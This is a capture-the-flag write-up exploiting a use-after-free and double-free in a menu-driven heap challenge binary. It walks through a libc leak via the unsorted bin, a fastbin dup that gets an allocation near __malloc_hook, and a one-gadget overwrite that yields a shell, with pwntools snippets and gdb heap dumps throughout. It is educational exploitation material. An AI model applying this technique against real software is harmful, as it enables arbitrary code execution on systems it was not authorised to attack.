### Binary Overview

```
1. Allocate
2. Pray for Allah
3. Free
4. Read
5. Run away
```

Classic stuff. We get to allocate, free and read chunks. Free and read work by providing an index inside a global array of malloc pointers.


### Vulnerability


The vulnerability can be found in the following assembly snippet:

```asm
00400c8a  mov     eax, dword [rbp-0xc {index}]
00400c8d  mov     eax, eax
00400c8f  mov     rax, qword [rax*8+0x602100]
00400c97  mov     rdi, rax
00400c9a  call    free
00400ca0  mov     rax, qword [rbp-0x8]
00400ca4  xor     rax, qword fs:[0x28]
             [...]
```

Once a chunk is free'd, its corresponding index in the mallocptr array (0x602100) isn't zeroed out. That gives us a UAF and a double-free
bug. 

### Plan

We're going to exploit the aforementioned bugs in the following way:

* Allocate 2 small chunks. 

* Freeing the 1st one (be careful not to free the 2nd one because it will consolidate with the top chunk) in order to populate its FD/BK pointers to main arena.

* Call read on the 1st chunk in order to leak the main arena pointer to calculate libc's base address. Thanks to the UAF vuln we're able to do that.

* Perform fastbin attack in order to overwrite __malloc_hook with one gadget RCE.


### Exploit Visualization 

```python
alloc(0x100, 'A'*10) # chunk 0
alloc(0x100, 'B'*10) # chunk 1
```

```
(gdb) x/60gx 0x0000000000603000
0x603000:	0x0000000000000000	0x0000000000000111  <-- chunk 0 [in use]
0x603010:	0x4141414141414141	0x00000000000a4141
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000000	0x0000000000000111  <-- chunk 1 [in use]
0x603120:	0x4242424242424242	0x00000000000a4242
```

```python
free(0)
```

```
(gdb) x/60gx 0x0000000000603000
0x603000:	0x0000000000000000	0x0000000000000111  <-- chunk 0 [free] 
0x603010:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000000
0x603080:	0x0000000000000000	0x0000000000000000
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000000
0x6030f0:	0x0000000000000000	0x0000000000000000
0x603100:	0x0000000000000000	0x0000000000000000
0x603110:	0x0000000000000110	0x0000000000000110
0x603120:	0x4242424242424242	0x00000000000a4242  <-- chunk 1 [in use]
```

### Current bin state

```
(gdb) heapinfo
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
                  top: 0x603220 (size : 0x20de0) 
       last_remainder: 0x0 (size : 0x0) 
            unsortbin: 0x603000 (size : 0x110)
```

Take note of the unsortbin field. As we know, when a small chunk is free'd, it's not placed in its corresponding smallbin list yet. Instead it's placed in the unsortbin list.
Malloc likes to give 1 chance of allocation to the current free'd chunk. That being said, if the next allocation requires data of size as big as
the current unsortbin's size, malloc will serve it back, or split it if the requested size is smaller. 

It's also known that when there's no fastbin, smallbin code
will serve back the request. Meaning, we should expect our new allocated fast chunk to be placed where the initual chunk 0 was.

```python
alloc(0x68, 'C'*10) # chunk 2
```

```
(gdb) x/60gx 0x0000000000603000
0x603000:	0x0000000000000000	0x0000000000000071  <-- chunk 2 [in use]
0x603010:	0x4343434343434343	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x00000000000000a1  <-- unsorted bin
0x603080:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
```

Look at that! Our fast chunk was indeed placed there! Malloc indeed split the free'd small chunk. Ofcourse in order for malloc to keep things the way they were, the heap state was organized in such way
that the free'd small chunk can be now found at `0x603070` with size `0xa0` (0x111 - 0x71 = 0xa0) The `1` in `0xa1` is there to signify the fact that the previous chunk is free).

```python
alloc(0x68, 'D'*10) # chunk 3
```

```
(gdb) x/60gx 0x0000000000603000
0x603000:	0x0000000000000000	0x0000000000000071  <-- chunk 2 [in use]
0x603010:	0x4343434343434343	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000071  <-- chunk 3 [in use]
0x603080:	0x4444444444444444	0x00007ffff70a4444
0x603090:	0x0000000000000000	0x0000000000000000
0x6030a0:	0x0000000000000000	0x0000000000000000
0x6030b0:	0x0000000000000000	0x0000000000000000
0x6030c0:	0x0000000000000000	0x0000000000000000
0x6030d0:	0x0000000000000000	0x0000000000000000
0x6030e0:	0x0000000000000000	0x0000000000000031
0x6030f0:	0x00007ffff7dd37b8	0x00007ffff7dd37b8
```

Once again the smallchunk in the unsorted binlist was split (0xa1 - 0x71 = 0x31).  

### Fastbin Attack

The time has come. We've allocated 2 fast chunks, time to perform the [fastbin attack](https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c). Let's trigger
the double-free bug firstly.

```python
free(3)
free(2)
free(3)
```

* `free(3)`

```
0x603000:	0x0000000000000000	0x0000000000000071  <-- chunk 2 [in use]
0x603010:	0x4343434343434343	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000071  <-- chunk 3 [free]
0x603080:	0x0000000000000000	0x00007ffff70a4444
```

```
(gdb) printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x603070 --> 0x0
(0x80)     fastbin[6]: 0x0
```

Chunk 3 was of fastbin size and it was placed in its corresponding fastbin list.


* `free(2)`

```
0x603000:	0x0000000000000000	0x0000000000000071  <-- chunk 2 [free]
0x603010:	0x0000000000603070	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000071  <-- chunk 3 [free]
0x603080:	0x0000000000000000	0x00007ffff70a4444
```

```
(gdb) printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x603000 --> 0x603070 --> 0x0
(0x80)     fastbin[6]: 0x0
```

Now chunk 2 is officially in the fastbin list and points to the previous free'd chunk. Remember, each of these bins maintains a single linked list and addition and deletion happen from the front of this list (LIFO manner).
Let's take advantage of the double-free vulnerability and free chunk 3 once again abusing the fact that malloc will only check if the chunk currently being free'd is the same as the one at the top of the fastbin list.

* `free(3)`

```
0x603000:	0x0000000000000000	0x0000000000000071
0x603010:	0x0000000000603070	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000071
0x603080:	0x0000000000603000	0x00007ffff70a4444
```

```
(gdb) printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x603070 --> 0x603000 --> 0x603070 (overlap chunk with 0x603070(freed) )
(0x80)     fastbin[6]: 0x0
```

Perfection! Based on the fact that addition and deletion happens from the head of the binlist (`0x603070` in our case), once we allocate a fast chunk of size `0x68`,
malloc will do the following:

* Check if there's a fast chunk in the corresponding fastbin list depending on the size that was requested.

* Since there is, delete the fast chunk from the head of the list and serve it back to the user.

In other words, on the next request, we should receive back `0x603070` as the memory area to store our data, which would change the fastbin list to `0x603000 --> 0x603070`.
However, here's the catch. We get to store data in a free'd chunk (since we'll get back `0x603070` and let it still be in the free list)! Let's prove it to ourselves.


```python
payload = p64(malloc_hook - 0x23)
alloc(0x68, payload)
```

```
(gdb) x/60gx 0x0000000000603000
0x603000:	0x0000000000000000	0x0000000000000071  <-- chunk 2 [free]
0x603010:	0x0000000000603070	0x00007ffff70a4343
0x603020:	0x0000000000000000	0x0000000000000000
0x603030:	0x0000000000000000	0x0000000000000000
0x603040:	0x0000000000000000	0x0000000000000000
0x603050:	0x0000000000000000	0x0000000000000000
0x603060:	0x0000000000000000	0x0000000000000000
0x603070:	0x0000000000000000	0x0000000000000071  <-- chunk 3 [in use]
0x603080:	0x00007ffff7dd371d	0x00007ffff70a440a
```

```
(gdb) printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x603000 --> 0x603070 --> 0x7ffff7dd371d
(0x80)     fastbin[6]: 0x0
```

Our assumptions were correct! `0x603070` was indeed deleted from the list and was given back to the user. We also overwrote the data in `0x603070` which happens to be in the fastbin list as well. Particularly, we ovewrote its FD pointer. Meaning, once we allocate `0x603070` again,
its FD will be placed on top of the list, leading to the next allocation giving us back the address `0x7ffff7dd371d`. 

Now you might be wondering why did I overwrite the FD with `malloc_hook - 0x23`. That's because of the following check malloc does:

```
if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0))
{
    errstr = "malloc(): memory corruption (fast)";
errout:
    malloc_printerr (check_action, errstr, chunk2mem (victim), av);
    return NULL;
}
```

Practically, it checks if the size of the chunk that is about to be given back to the user is indeed within the range of a fastbin. If it is, all good, if not, adios.
So all we have to do is overwrite the FD of `0x603070` with an address close to __malloc_hook's such that address->size is in the range of the fastbin sizes.
```
(gdb) x/4gx 0x7ffff7dd3740 - 0x30 + 0xd
0x7ffff7dd371d:	0xfff7a95bb0000000	0x000000000000007f
0x7ffff7dd372d:	0xfff7a95b50000000	0x000000000000007f
```

Let's move on with our allocations.

```python
alloc(0x68, 'F'*10)
alloc(0x68, 'G'*10)
```

```
(gdb) printfastbin 
(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x7ffff7dd371d
(0x80)     fastbin[6]: 0x0
```

Our fastbin list is looking cute. Now once we allocate one more chunk, we'll get back `0x7ffff7dd371d`, which is an address relatively close to __malloc_hook's address and we can overwrite it with the one gadget's address.

```python
payload  = ''
payload  = payload.ljust(0x13, 'A')
payload += p64(one_shot)

alloc(0x68, payload)
```

```
0x7ffff7dd3740 <__malloc_hook>:	0x00007ffff7b016c4
```

Voila!

```
[*] Leak:          0x7ffff7dd37b8
[*] Libc:          0x7ffff7a12000
[*] __malloc_hook: 0x7ffff7dd3740
[*] Switching to interactive mode
$ whoami
vagrant
```




